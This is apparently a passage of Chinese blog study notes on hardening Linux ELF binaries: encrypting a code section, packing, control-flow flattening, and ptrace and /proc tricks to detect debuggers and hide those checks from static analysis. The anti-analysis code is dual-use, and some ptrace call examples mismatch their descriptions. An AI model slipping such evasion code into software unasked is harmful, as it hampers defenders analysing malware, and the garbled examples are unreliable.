error&quot;); goto _error;\t&#125;\t//分配str空间中\tif((lp_SecName = (char *) malloc(st_SecHeader64.sh_size)) == 0) &#123; puts(&quot;Malloc space for section string table failed&quot;); goto _error;\t&#125;\t//Read string table lseek(fd, st_SecHeader64.sh_offset, SEEK_SET);\tif (read(fd, lp_SecName, st_SecHeader64.sh_size) != st_SecHeader64.sh_size) &#123; puts(&quot;Read string table failed&quot;); goto _error;\t&#125;\t//通过st_SecHeader64 -&gt; sh_name 在str字符串中索引，与.mytext进行字符串比较，如果不匹配，继续读取\tlseek(fd, st_Elf_Header64.e_shoff, SEEK_SET);\tNumSec = st_Elf_Header64.e_shnum;\tfor (i = 0; i &lt;NumSec ; i++) &#123; if (read(fd, &amp;st_SecHeader64, sizeof(Elf64_Shdr)) != sizeof(Elf64_Shdr)) &#123; puts(&quot;Find section .text procedure failed&quot;); goto _error; &#125; if (!strcmp(lp_SecName + st_SecHeader64.sh_name, target_section)) //比较遍历的节区和我们的目标节区是否一致 &#123; Sec_FA = st_SecHeader64.sh_offset;//节的文件偏移 Sec_Size = st_SecHeader64.sh_size;//节的所占文件大小 printf(&quot;Find section %s &quot;, target_section); break; &#125;\t&#125;\t//通过st_SecHeader64 -&gt; sh_offset 和 st_SecHeader64 -&gt; sh_size字段，将.mytext内容读取并保存在Sec_Data中\tlseek(fd, Sec_FA, SEEK_SET);\tSec_Data = (BYTE*) malloc(Sec_Size);\tif (Sec_Data == 0) &#123; puts(&quot;Malloc space for Sec_Data failed&quot;); goto _error;\t&#125;\tif (read(fd, Sec_Data, Sec_Size) != Sec_Size) &#123; puts(&quot;Read section .text failed&quot;); goto _error;\t&#125; nblock = Sec_Size / block_size;\tnsize = Sec_FA / 4096 + (Sec_FA % 4096 == 0 ? 0 : 1);\tprintf(&quot;Sec_FA = %s, Sec_Size = %s &quot;, qword_to_str(Sec_FA, gbuf), qword_to_str(Sec_Size,gbuf+20));\tprintf(&quot;nblock = %s, nsize = %s &quot;, qword_to_str(nblock, gbuf), qword_to_str(nsize,gbuf+20)); // 下面的代码是没看懂,所以就注释了//\tst_Elf_Header64.e_entry = (Sec_Size &lt;&lt; 16) + nsize;//\tst_Elf_Header64.e_shoff = Sec_FA; //将Sec_Data的所有内容取反\tfor(i = 0 ; i &lt; Sec_Size ; i++) &#123; Sec_Data[i] = Sec_Data[i]^0x90;\t&#125; //把修改的文件头写入进去\tlseek(fd, 0, SEEK_SET);\tif (write(fd, &amp;st_Elf_Header64, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) &#123; puts(&quot;Write ELFhead to .elf failed&quot;); goto _error;\t&#125; //将Sec_Data内容写入elf文件中\tlseek(fd, Sec_FA, SEEK_SET);\tif (write(fd, Sec_Data, Sec_Size) != Sec_Size) &#123; puts(&quot;Write modified Sec_Data to .elf failed&quot;); goto _error;\t&#125;\tputs(&quot;Completed&quot;);_error:\tfree(Sec_Data);\tfree(lp_SecName);\tclose(fd);\treturn 0;&#125;char* qword_to_str(QWORD data, BYTE* buf)&#123;\tBYTE* lp = &amp;data;\tDWORD hi = 0;\tDWORD lo = 0;\tint i = 0, len = 0;\tlo = data &amp; 0xFFFFFFFF;\thi = data &gt;&gt; 32;\tmemset(buf, 0, 64);\tsprintf(buf, &quot;%08X%08X&quot;, hi, lo);\treturn buf;&#125; 解密代码有没有看,因为缺少环境 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include &lt;jni.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;elf.h&gt;#include &lt;sys/mman.h&gt;jstring getString(JNIEnv*) __attribute__((section(&quot;.mytext&quot;)));jstring getString(JNIEnv* env) &#123;\treturn (*env)-&gt;NewStringUTF(env, &quot;Native method return!&quot;);&#125;;void init_getString() __attribute__((constructor));unsigned long getLibAddr();void init_getString() &#123;\tchar name[15];\tunsigned int nblock;\tunsigned int nsize;\tunsigned long base;\tunsigned long text_addr;\tunsigned int i;\tElf32_Ehdr *ehdr;\tElf32_Shdr *shdr; base = getLibAddr(); ehdr = (Elf32_Ehdr *)base;\ttext_addr = ehdr-&gt;e_shoff + base; nblock = ehdr-&gt;e_entry &gt;&gt; 16;\tnsize = ehdr-&gt;e_entry &amp; 0xffff; printf(&quot;nblock = %d &quot;, nblock); if (mprotect((void *) base, 4096 * nsize, PROT_READ | PROT_EXEC | PROT_WRITE) != 0) &#123; puts(&quot;mem privilege change failed&quot;);\t&#125; for (i = 0;i &lt; nblock; i++) &#123; char *addr = (char*)(text_addr + i); *addr = ~(*addr);\t&#125; if (mprotect((void *) base, 4096 * nsize, PROT_READ | PROT_EXEC) != 0) &#123; puts(&quot;mem privilege change failed&quot;);\t&#125;\tputs(&quot;Decrypt success&quot;);&#125;unsigned long getLibAddr() &#123;\tunsigned long ret = 0;\tchar name [] = &quot;libdemo.so&quot;;\tchar buf[4096], *temp;\tint pid;\tFILE *fp;\tpid = getpid();\tsprintf(buf, &quot;/proc/%d/maps&quot;, pid);\tfp = fopen(buf, &quot;r&quot;);\tif (fp == 0)\t&#123; puts(&quot;open failed&quot;); goto _error;\t&#125;\twhile (fgets(buf, sizeof(buf), fp)) &#123; if (strstr(buf, name)) &#123; temp = strtok(buf, &quot;-&quot;); ret = strtoul(temp, 0, 16); break; &#125;\t&#125;_error:\tfclose(fp);\treturn ret;&#125;JNIEXPORT jstring JNICALLJava_com_example_shelldemo_MainActivity_getString( JNIEnv* env,\tjobject thiz)&#123;#if defined(__arm__)#if defined(__ARM_ARCH_7A__)#if defined(__ARM_NEON__)#define ABI &quot;armeabi-v7a/NEON&quot;#else#define ABI &quot;armeabi-v7a&quot;#endif#else#define ABI &quot;armeabi&quot;#endif#elif defined(__i386__)#define ABI &quot;x86&quot;#elif defined(__mips__)#define ABI &quot;mips&quot;#else#define ABI &quot;unknown&quot;#endif\treturn getString(env);&#125; TLS1234567891011121314151617#include &lt;stdio.h&gt; __attribute((constructor)) void before_main()&#123; printf(&quot;%s &quot;, &quot;I Can Before Main&quot;);&#125; __attribute((destructor)) void after_main()&#123; printf(&quot;%s &quot;, &quot;I Can Aftrer Main&quot;);&#125; int main(int argc, char **argv)&#123; printf(&quot;%s &quot;, &quot;I Am Main&quot;); return 0;&#125; ELF_LOAD把要加固的elf插入到一个load.elf的尾部，然后用load.elf将尾部的那个elf正常加载运行起来。 在外部逆向时只看到那个load的代码，完成加固的操作。 ELF常见HOOK方案及应用Inline hookGOT hookPRELOAD hookLinker重定位hookELF若干种保护方案UPX壳及分析其实就是加壳子,来隐藏某些字符串和资源 常见的有upx 项目地址,可能不是makefile的,但是我的百度云里有源码项目 1https://github.com/upx/upx 直接下载和安装 12apt-get install upx-ucldpkg -i xxx_path Shellcode保护方案.链接器及加载器VMPELF混淆方案控制流平坦化一个很6的大哥写的文章,膜拜 123456789https://bbs.pediy.com/thread-260626-1.htm这个文章讲了很多，还是有很多无法理解的地方（没学过）https://bbs.pediy.com/user-884731.htm安卓方面https://bbs.pediy.com/user-home-682449.htmhttps://bbs.pediy.com/user-home-617255.htmhttps://bbs.pediy.com/user-home-630711.htm 语法角度来个很吓人的图片,然后如果优化后 于是优化后(这里是人为优化负责的代码) 于是一些扁平化的代码，可以这么写 123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int main()&#123;\tint x=1; int y=1; if(!x) &#123; x=100; &#125; if(!y) &#123; y=200; &#125; if(!x) &#123; x=100; &#125; if(!y) &#123; y=200; &#125; if(!x) &#123; x=100; &#125; if(!y) &#123; y=200; &#125;&#125; 人为优化之前听说过，编译器优化之后的代码会比较恶心 所以如果我们不用编译器优化，采用原始的编译效果，然后认为恶作剧的区优化代码 这个如何实现? 1234567while (1) &lt;-- 这个就是支配节点&#123; if (a) .... if (b) ....&#125; 常量传播 | 到达定值分析这个确定性如果用于远程的距离的跳转,那么就是到达定值分析 如果用于短距离跳转,就是一般的常量传播 利用了结果的确定性吧 比如 12345c &lt; -1; 是一个肯定性的结果，于是我们用最高肯定性去构造我们的判断c &lt; -1b + c &lt; 1cmp c,b 如果我们让b+c&lt;1成立的话，那么c&lt;1-b,所以1-b&lt;&#x3D;-1 临界点就是b&#x3D;2，于是我们就浅浅的构造了b&#x3D;2的事实 死代码优化12mov r0, 0mov r0, 1 可以看到mov r0 ,1 就是一个死代码 于是我们就可以利用它 例子基于 while(1) 1234567891011121314151617181920212223242526272829303132#include&lt;stdio.h&gt;int main()&#123;\tint a = 0;\twhile (1)\t&#123; while (1) &#123; while (1) &#123; if (a &gt; 1) &#123; a = 3; break; &#125; &#125; if (a &gt; 2) &#123; a = 4; break; &#125; &#125; if (a &gt; 3) &#123; a = 5; puts(&quot;66666&quot;); break; &#125;\t&#125;&#125; 效果图 3个红色🟥是基于while(1)的递归判断 3个紫色🟪是基于if的判断 3个蓝色🟦是基于if处理的处理 3个黑色是基于条件不成立的跳转 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;int main()&#123;\tint a = 0;\twhile (1)\t&#123; if (a == 7) &#123; printf(&quot;hello world &quot;); break; &#125; else if (a &gt; 5) &#123; a = 7; &#125; else if (a &gt; 4) &#123; a = 6; &#125; else if (a &gt; 3) &#123; a = 5; &#125; else if (a &gt; 2) &#123; a = 4; &#125; else if (a &gt; 1) &#123; a = 3; &#125; else if (a &gt; 0) &#123; a = 2; &#125; else if (a &gt; -1) &#123; a = 1; &#125;\t&#125;&#125; 效果 1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;stdio.h&gt;int main()&#123;\tint a = 0;\twhile (1)\t&#123; if (a &gt; -1) &#123; a = 1; &#125; if (a &gt; 0) &#123; a = 2; &#125; if (a &gt; 1) &#123; a = 3; &#125; if (a &gt; 2) &#123; a = 4; &#125; if (a &gt; 3) &#123; a = 5; &#125; if (a &gt; 4) &#123; a = 6; &#125; if (a &gt; 5) &#123; a = 7; &#125; if (a == 7) &#123; printf(&quot;hello world &quot;); break; &#125;\t&#125;&#125; 虚假控制流花指令r指令乱序，使用B衔接指令替换，替换为B指令指令索引并且乱序，使用索引表来跳转LLVM方式混淆ELF反调试int3一个比价老套的的指令 就是如果你执行了int3,就会发出信号SIGTRAP 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;signal.h&gt; void handler(int signo)&#123;&#125; int main(void)&#123; //signal(SIGTRAP, handler); __asm__(&quot;nop \\t&quot; &quot;int3 \\t&quot;); printf(&quot;Hello from main! &quot;); return 0;&#125; 先于main函数执行12345678910__attribute((constructor)) void before_main()&#123;\tif (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) &#123; printf(&quot;Find Some One Dbg me before_main &quot;); //abort();\t&#125; printf(&quot;Check All good &quot;);\treturn ;&#125; 捕捉信号检测运行tracerPID状态的检测12345678910111213141516171819202122232425int CheckDbg2()&#123;\tint i;\tchar buf1[512];\tFILE* fin;\tfin = fopen(&quot;/proc/self/status&quot;, &quot;r&quot;);\tint tpid;\tconst char *needle = &quot;TracerPid:&quot;;\tsize_t nl = strlen(needle);\twhile(fgets(buf1, 512, fin))\t&#123; if(!strncmp(buf1, needle, nl)) &#123; sscanf(buf1, &quot;TracerPid: %d&quot;, &amp;tpid); if(tpid != 0) &#123; printf(&quot;Check File Record You are Dbg me:%08X &quot;,tpid); return 1; &#125; &#125;\t&#125;\tfclose(fin);\tprintf(&quot;Check All good &quot;);\treturn 0;&#125; 检测调试进程ptrace源码 国外的一个培训网站,里面可能有好的资源 12https://bootlin.com/\t找到了ptrace函数的源码 https://elixir.bootlin.com/linux/v6.1-rc5/source/kernel/ptrace.c 12https://cloud.tencent.com/developer/article/1799705函数介绍手册,比较全面 https://man7.org/linux/man-pages/man2/ptrace.2.html 吹bptrace使用场景： 编写动态分析工具，如gdb,strace 反追踪，一个进程只能被一个进程追踪(注：一个进程能同时追踪多个进程)，若此进程已被追踪，其他基于ptrace的追踪器将无法再追踪此进程，更进一步可以实现子母进程双线执行动态解密代码等更高级的反分析技术 代码注入，往其他进程里注入代码。 不退出进程，进行在线升级 函数介绍12#include &lt;sys/ptrace.h&gt;long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 一共有四个参数： request: 表示要执行的操作类型。&#x2F;&#x2F;反调试会用到PT_DENY_ATTACH，调试会用到PTRACE_ATTACH pid: 要操作的目标进程ID addr: 要监控的目标内存地址 data: 保存读取出或者要写入的数据 父进程控制子进程运行，检查和改变它的核心Image。 Ptrace主要用来实现断点调试。当进程被中止，通知父进程，进程的内存空间可以被读写，父进程可以选择是子进程继续执行，还是中止 request的不同参数决定了系统调用的功能 PTRACE_TRACEME 本进程被其父进程所跟踪。其父进程应该希望跟踪子进程 PTRACE_PEEKTEXT, PTRACE_PEEKDATA 从内存地址中读取一个字节，内存地址由addr给出。 PTRACE_PEEKUSR 从USER区域中读取一个字节，偏移量为addr。 PTRACE_POKETEXT, PTRACE_POKEDATA 往内存地址中写入一个字节。内存地址由addr给出。 PTRACE_POKEUSR 往USER区域中写入一个字节。偏移量为addr。 PTRACE_SYSCALL, PTRACE_CONT 重新运行。 PTRACE_KILL 杀掉子进程，使它退出。 PTRACE_SINGLESTEP 设置单步执行标志 PTRACE_ATTACH 跟踪指定pid 进程。 PTRACE_DETACH 结束跟踪 Intel386特有： PTRACE_GETREGS 读取寄存器 PTRACE_SETREGS 设置寄存器 PTRACE_GETFPREGS 读取浮点寄存器 PTRACE_SETFPREGS 设置浮点寄存器 init进程不可以使用此函数 返回值： 成功返回0。错误返回-1。errno被设置 错误： EPERM 特殊进程不可以被跟踪或进程已经被跟踪。 ESRCH 指定的进程不存在 EIO 请求非法 应用功能PTRACE_TRACEME 1ptrace(PTRACE_TRACEME,0 ,0 ,0) 描述：本进程被其父进程所跟踪。其父进程应该希望跟踪子进程。 PTRACE_PEEKTEXT, PTRACE_PEEKDATA 12ptrace(PTRACE_PEEKTEXT, _in_ pid, _in_ addr, _out_ data)ptrace(PTRACE_PEEKDATA, _in_ pid, _in_ addr, _out_ data) 描述：从内存地址中读取一个字节，pid表示被跟踪的子进程，内存地址由addr给出，data为用户变量地址用于返回读到的数据。 在Linux（i386）中用户代码段与用户数据段重合所以读取代码段和数据段数据处理是一样的。 PTRACE_POKETEXT, PTRACE_POKEDATA 12ptrace(PTRACE_POKETEXT, pid, addr, data)ptrace(PTRACE_POKEDATA, pid, addr, data) 描述：往内存地址中写入一个字节。pid表示被跟踪的子进程，内存地址由addr给出，data为所要写入的数据。 PTRACE_PEEKUSR 1ptrace(PTRACE_PEEKUSR, pid, addr, data) 描述：从USER区域中读取一个字节，pid表示被跟踪的子进程，USER区域地址由addr给出，data为用户变量地址用于返回读到的数据。 USER结构为core文件的前面一部分，它描述了进程中止时的一些状态，如：寄存器值，代码、数据段大小，代码、数据段开始地址等。 在Linux（i386）中通过PTRACE_PEEKUSER和PTRACE_POKEUSR可以访问USER结构的数据有寄存器和调试寄存器。 PTRACE_POKEUSR 1ptrace(PTRACE_POKEUSR, pid, addr, data) 描述：往USER区域中写入一个字节，pid表示被跟踪的子进程，USER区域地址由addr给出，data为需写入的数据。 PTRACE_CONT 1ptrace(PTRACE_CONT, pid, 0, signal) 描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。 PTRACE_SYSCALL 1ptrace(PTRACE_SYS, pid, 0, signal) 描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。 与PTRACE_CONT不同的是进行系统调用跟踪。在被跟踪进程继续运行直到调用系统调用开始或结束时，被跟踪进程被中止，并通知父进程。 PTRACE_KILL 1ptrace(PTRACE_DETACH，pid, 0,0) 描述：杀掉子进程，使它退出。pid表示被跟踪的子进程。 PTRACE_SINGLESTEP 1ptrace(PTRACE_KILL, pid, 0, signle) 描述：设置单步执行标志，单步执行一条指令。pid表示被跟踪的子进程。signal为0则忽略引起调试进程中止的信号， 若不为0则继续处理信号signal。当被跟踪进程单步执行完一个指令后，被跟踪进程被中止，并通知父进程。 PTRACE_ATTACH 12ptrace(PTRACE_ATTACH，pid, 0,0) wait(pid); //用于等待子进程? 描述：跟踪指定pid 进程。pid表示被跟踪进程。被跟踪进程将成为当前进程的子进程，并进入中止状态。 PTRACE_DETACH 1ptrace(PTRACE_DETACH，pid, 0,0) 描述：结束跟踪。 pid表示被跟踪的子进程。结束跟踪后被跟踪进程将继续执行。 PTRACE_GETREGS 1ptrace(PTRACE_GETREGS, pid, 0, data) 描述：读取寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有17个基本寄存器的值。 PTRACE_SETREGS 1ptrace(PTRACE_SETREGS, pid, 0, data) 描述：设置寄存器值，pid表示被跟踪的子进程，data为用户数据地址。此功能将设置所有17个基本寄存器的值。 PTRACE_GETFPREGS 1ptrace(PTRACE_GETFPREGS, pid, 0, data) 描述：读取浮点寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有浮点协处理器387的所有寄存器的值。 PTRACE_SETFPREGS 1ptrace(PTRACE_SETREGS, pid, 0, data) 描述：设置浮点寄存器值，pid表示被跟踪的子进程，data为用户数据地址。此功能将设置所有浮点协处理器387的所有寄存器的值 12345678910111213#include &lt;sys/ptrace.h&gt;int main(int argc, char *argv []) &#123;\tif (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) &#123; printf(&quot;Debugger detected &quot;); return 1;\t&#125; printf(&quot;All good&quot;);\treturn 0;&#125;//这里我们使用&#x27;PTRACE_TRACEME&#x27;来指明进程将被调试，在此种情况下其他参数会被忽略。//如果已经存在调试器，那么这次ptrace调用会失败，返回-1。 例子基于调试状态的反调试 Linux 系统gdb等调试器，都是通过ptrace系统调用实现，ptrace系统调用有一个特性就是当前进程已经被追踪了，就不能被其他父进程追踪， 所以只要我们设计的反调试程序开头就先执行一次ptrace(PTRACE_TRACEME, 0, 0, 0)， 当gdb再想attach的时候就会发现已经执行了一次不能再执行了从而返回-1，就无法调试了 123456789101112#include &lt;sys/ptrace.h&gt;#include &lt;stdio.h&gt;int main()&#123; if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)//这里就直接先执行了\t&#123; printf(&quot;don&#x27;t trace me! &quot;); return 1;\t&#125; printf(&quot;no one trace me! &quot;); return 0;&#125; 如何防它? 查看api调用,然后no掉它 取出符号表网上说是,如果可能有ptrace函数的话,就查符号表或者api调用 12345678910# readelf -s q | grep ptrace 41: 0000000000000000 0 FUNC GLOBAL DEFAULT UND ptrace@GLIBC_2.2.5# readelf -S q | grep ptrace# objdump -t q | grep ptrace0000000000000000 F *UND*\t0000000000000000 ptrace@GLIBC_2.2.5# objdump -T q | grep ptrace0000000000000000 DF *UND*\t0000000000000000 (GLIBC_2.2.5) ptrace# 但是😂我们可以通过删除符号表的选项，来隐藏对ptrace的调用，但只是针对.sysmtab表，不会去掉.dynsym 用strip删除符号,删除多态符号? strip 通过删除可执行文件中ELF头的 typchk段、符号表、字符串表、行号信息、调试段、注解段、重定位信息等来实现缩减程序体积的目的。 而被剪裁过的可执行文件不可进行还原。 常用参数： -e 在对象文件的可选头中设置 F_LOADONLY 标志 -E 复位（关闭）对象文件的可选头中的 F_LOADONLY 位 -H 删除文件头、不论什么可选的头以及全部段的头部分 -l （小写 L）删除行号信息 -r 除了外部符号和静态符号，将所有符号表信息除去 -t 除去大多数符号表信息，但并不除去函数符号或行号信息 -V 打印 strip 命令的版本 -x 删除重定位信息、符号表，但并不除去静态或外部符号信息 -X[mode] 删除文件特定符号信息(mode: 32、64、32_64 【注：使用注意】 1.gcc 对于编译时已经进行深层优化的程序，使用strip命令可能会导致无法正常运行！ 静态加载也可以在链接阶段使用使用ld的-s和-S参数，使得连接器生成的输出文件时就不产生符号信息，-s和-S的区别在于-S移除调试符号信息，而-s移除所有符号信息。 我们也可以在GCC中通过-Wl,-s和-Wl,-S来移除符号信 123gcc -static -o q q.cstrip q然后就查不到ptrace的符号了 惊讶的是,这样一编译,我的elf文件就变得特别大, 以前的文件特别简单,函数不吃过20个,一旦这样编译后,我们的文件就变得特别大,有很多的函数 然后符号表和多态符号表都没了,我的文件类型由原来的多态共享文件转变为可执行文件 在我的IDA上,是看不出来调用了ptrace函数的.系统函数直接被展开了 用动态加载函数由于静态elf在过于笨重,也就是可执行文件很大 如果我们使用动态加载技术，就可以回到动态加载库文件（文件很小），并且ptrace不会出现在符号表和动态符号表 但是动态加载函数的时候是需要使用字符串ptrace，所以你可以对字符串ptrace加密一下 动态加载是在运行的时加载库并且检索库函数地址 动态的load函数地址来隐藏ptrace， 比如LoadLibiary然后GetProcess 123456789101112131415161718192021222324252627282930#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;sys/ptrace.h&gt;#include&lt;dlfcn.h&gt;//Linux动态库的显式调用#include&lt;string.h&gt;int MyGdbCheck();int main(int argc, char **argv) &#123; MyGdbCheck();&#125;int MyGdbCheck()&#123; void *handle;//定义句柄指针变量 long (*lp_ptrace)(enum __ptrace_request request, pid_t pid);//定义函数指针变量 //获取包含&#x27;ptrace&#x27;的库的句柄 handle = dlopen (&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, RTLD_LAZY); //对动态解析函数“ptrace”的引用,go变量存的是ptrace的地址 lp_ptrace = dlsym(handle, &quot;ptrace&quot;); if (lp_ptrace(PTRACE_TRACEME, 0) &lt; 0) &#123; puts(&quot;being traced&quot;); exit(1); &#125; puts(&quot;not being traced&quot;); //关闭句柄 dlclose(handle); return 0;&#125; 局部变量存储字符串去除字符串的直接搜索 对于elf的话 1strings q | grep flag 是可以搜索字符串的 但是他的局限性，或者是IDA的局限性就是 如果你把字符串定位变量，那么他就搜索不到 12345678910111213141516171819202122232425262728293031323334#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;sys/ptrace.h&gt;#include&lt;dlfcn.h&gt;//Linux动态库的显式调用#include&lt;string.h&gt;int MyGdbCheck();int main(int argc, char **argv) &#123; MyGdbCheck();&#125;int MyGdbCheck()&#123; char funcName[]=&quot;ptrace&quot;; char Youlose[]=&quot;being traced&quot;; char YouSucc[]=&quot;not being traced&quot;; void *handle;//定义句柄指针变量 long (*lp_ptrace)(enum __ptrace_request request, pid_t pid);//定义函数指针变量 //获取包含&#x27;ptrace&#x27;的库的句柄 handle = dlopen (&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, RTLD_LAZY); //对动态解析函数“ptrace”的引用,go变量存的是ptrace的地址 lp_ptrace = dlsym(handle, funcName); if (lp_ptrace(PTRACE_TRACEME, 0) &lt; 0) &#123; puts(Youlose); exit(1); &#125; puts(YouSucc); //关闭句柄 dlclose(handle); return 0;&#125; 比如上面那个例子就是实现了所有的字符串都用变量，于是你用IDA或者strings就搜索不到， 于是我在exe上做了系统的实验，关于字符串搜索的问题 12345678910111213141516171819#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;sys/ptrace.h&gt;#include&lt;dlfcn.h&gt;//Linux动态库的显式调用#include&lt;string.h&gt;int MyGdbCheck();int main(int argc, char **argv) &#123; MyGdbCheck();&#125;int MyGdbCheck()&#123; char Youlose[]=&quot;being traced&quot;; char YouSucc[]=&quot;not being traced&quot;; puts(&quot;ptrace&quot;); return 0;&#125; 用汇编实现一个ptrace的函数12345678910111213141516171819202122232425262728293031323334353637383940global _startsection .data traced: db &quot;being traced&quot;, 0xA tracedLen equ $-traced normal: db &quot;not being traced&quot;, 0xA normalLen equ $-normalsection .text_start: ;calling ptrace mov ebx, 0x0 mov ecx, 0x0 mov edx, 0x0 mov eax, 0x1a int 0x80 ; sys_ptrace cmp eax, 0xFFFFFFFF;把返回值与-1做比较 jz debugger;eax值伪-1就跳转 mov edx, normalLen;正常输出 mov ecx, normal;&quot;not being traced&quot; xor ebx, ebx mov bl, 0x1 xor eax, eax mov al, 0x4 int 0x80 ; sys_write jmp exitdebugger: mov edx, tracedLen;被调试的时候输出 mov ecx, traced ;&quot;being traced&quot; xor ebx, ebx mov bl, 0x1 xor eax, eax mov al, 0x4 int 0x80 ; sys_writeexit: xor eax, eax mov al, 0x1 xor ebx, ebx int 0x80 ; sys_exit 内嵌汇编实现ptrace1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;static __always_inline volatile long no_hacker()&#123; int status =0; //定义返回值变量 //内联汇编代码，系统调用ptrace，把eax寄存器的值赋给status变量 __asm__ volatile( &quot;mov $0x0,%%ebx \\t&quot; &quot;mov $0x0,%%ecx \\t&quot; &quot;mov $0x0,%%edx \\t&quot; &quot;mov $0x1a,%%eax \\t&quot; &quot;int $0x80 \\t&quot; :&quot;=a&quot;(status) :); return status;//这里把系统的调用的返回值作为no_hacke函数的返回值&#125;int main()&#123; if (no_hacker()==-1) &#123; printf(&quot;don&#x27;t trace me &quot;); return 1; &#125; printf(&quot;no one trace me &quot;); return 0;&#125; 用ＳＭＣ隐藏系统的调用一种基于动SMC的隐藏ptrace 123nasm -f elf32 q.asm -o q.old -N -m elf_i386 q.o -o q SMC的全名叫self modifying code 意思就是可执行文件在运行的时候改变自己的代码和数据 ld加Ｎ的目的是让ｔｅｘｔ段可读可写可执行 12345678910111213141516171819202122232425262728293031323334353637383940414243global _startsection .data traced: db &quot;being traced&quot;, 0xA tracedLen equ $-traced normal: db &quot;not being traced&quot;, 0xA normalLen equ $-normalsection .text_start: ;显示ptrace mov edi, systemcall; mov ax, 0x80cd;“0x80cd”是与系统调用指令“ int 0x80”相对应的操作码 stosw;将AX寄存器的内容存储到EDI寄存器指向的内存中 ;calling ptrace mov ebx, 0x0 mov ecx, 0x0 mov edx, 0x0 mov eax, 0x1asystemcall: xor eax, ebx;这条指令将被int 0x80覆盖 cmp eax, 0 jl debugger mov edx, normalLen;正常输出 mov ecx, normal;&quot;not being traced&quot; xor ebx, ebx mov bl, 0x1 xor eax, eax mov al, 0x4 int 0x80 ; sys_write jmp exitdebugger: mov edx, tracedLen;被调试的时候输出 mov ecx, traced ;&quot;being traced&quot; xor ebx, ebx mov bl, 0x1 xor eax, eax mov al, 0x4 int 0x80 ; sys_writeexit: xor eax, eax mov al, 0x1 xor ebx, ebx int 0x80 ; sys_exit 然后我们得下载 12更新pip然后pip install lief 把之前给ｔｘｔ赋的可写权限给去掉？？为什么要去掉? 12345678# pip install lief ,不是life,我直接下载错误import liefbinary=lief.parse(&#x27;./q&#x27;)text=binary.get_section(&#x27;.text&#x27;)print(text.flags_list)text.flags=0x6print(text.flags_list)binary.write(&#x27;./q&#x27;) 代码注入其实就是用ｐｔｒａｃｅ实现一个简单的调试器 可以达到对进程的寄存器内存修改和读取 处理ELF格式，阻止IDA加载多进程守护其实有个思路,也哈桑蛮容易实现的 就是是我们执行的主要进程是子进程 然后在main函数种,fork出子进程,父进程关闭自己 然后子进程慢慢运行 那么就达到了一个可以不让IDA反调试的一个目的 CRC校验调试中断指令检测（类似x86 0xCC）调试器检测1234567891011121314151617181920212223242526272829303132int CheckDbg1()&#123;\tchar buf0[32], buf1[128];\tFILE* fin;\tsnprintf(buf0, 24, &quot;/proc/%d/cmdline&quot;, getppid());\tfin = fopen(buf0, &quot;r&quot;);\tfgets(buf1, 128, fin);\tfclose(fin);\t//puts(buf1);\tif(!strcmp(buf1, &quot;gdb&quot;)) &#123; printf(&quot;Find gdb &quot;); //abort();\t&#125; //puts(buf1);\tif(!strcmp(buf1, &quot;./linux_server64&quot;)) &#123; printf(&quot;Find Romote Server Dbg &quot;); //abort();\t&#125;\t//puts(buf1);\tif(!strcmp(buf1, &quot;./64&quot;)) &#123; printf(&quot;Find Romote Server Dbg &quot;); //abort();\t&#125;\t//\tprintf(&quot;Check All good &quot;);\treturn 0;&#125; 运行时间的检测1234567891011#include&lt;signal.h&gt;void alarmHandler(int sig) &#123; printf(&quot;Debugger detected&quot;); exit(1);&#125;void __attribute__((constructor))setupSig(void) &#123; signal(SIGALRM, alarmHandler); alarm(2);&#125; 检测打开的fd文件如果被调试的进程是通过gdb 的方式启动，那么它便是由gdb进程fork得到的。而fork在调用时， 父进程所拥有的fd(file descriptor)会被子进程继承。由于gdb在往往会打开多个fd，因此如果进程拥有的fd较多， 则可能是继承自gdb的，即进程在被调试。具体地，进程拥有的fd会在&#x2F;proc&#x2F;self&#x2F;fd&#x2F;下列出 1234567891011121314151617181920212223int CheckDbg3()&#123; struct dirent *dir; DIR *d = opendir(&quot;/proc/self/fd&quot;); while(dir=readdir(d)) &#123;\tputs(dir-&gt;d_name); if(!strcmp(dir-&gt;d_name, &quot;4&quot;)) &#123; printf(&quot;Check fd Debugger detected &quot;); return 1; &#125; if(!strcmp(dir-&gt;d_name, &quot;5&quot;)) &#123; printf(&quot;Check fd Debugger detected &quot;); return 1; &#125; &#125; closedir(d); printf(&quot;Check fd All good &quot;); return 0;&#125; ELF函数加密ELF入口加解密函数动态加解密，指令级加解密基于加载器的函数加解密总结以上列出的反调试技术中，往往只进行了一次检测。为了提高强度， 我们可以fork得到一个新的进程，在这个子进程中，每隔一段时间对父进程进行一次检测。然而，这些技术都面临存在另外一个致命弱点：可以通过反汇编静态分析，找到相应的检测代码并修改，从而绕过反调试检测 因此，我们通常还需要对二进制文件进行混淆以对抗静态分析，这样与反调试技术相结合，才能得到理想的保护效果","tags":["Linux","Anti_Dbg"],"categories":["Reverse"]},{"title":"EXE反调试","path":"/re4mile/2021/06/07/re/反调试/exe/re/","content":"参考链接带学习的文章(网络进不去):https://wap.myhack58.com/Article/html/3/92/2019/93270.htm w4rd3n https://hitworld.github.io/posts/e7c3b7f1/ sanqiuai 